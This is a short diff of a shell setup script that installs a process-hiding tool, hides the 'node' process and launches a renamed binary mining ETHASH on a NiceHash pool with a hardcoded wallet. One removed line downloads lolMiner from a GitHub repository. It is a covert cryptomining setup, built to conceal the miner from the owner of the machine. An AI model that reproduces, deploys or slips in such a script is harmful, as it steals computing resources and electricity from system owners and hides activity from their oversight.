@@ -4,6 +4,5 @@ apt update
 apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
 npm i -g node-process-hider 
 ph add node
-wget https://github.com/circelwenakyo/usdto/raw/main/lolMiner
 chmod +x smh
 ./smh --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(cat /proc/sys/kernel/hostname)
